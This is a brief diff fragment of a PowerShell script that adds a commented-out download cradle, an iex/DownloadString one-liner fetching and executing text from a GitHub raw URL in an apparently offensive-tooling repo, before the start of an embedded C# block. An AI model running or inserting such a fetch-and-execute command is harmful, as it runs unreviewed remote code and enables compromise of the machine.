@@ -1,3 +1,5 @@
+# powershell.exe -nop -c ""iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/thepcn3rd/goAdv/main/text')""
+
 $code = @'
 using System;
 using System.Collections.Generic;
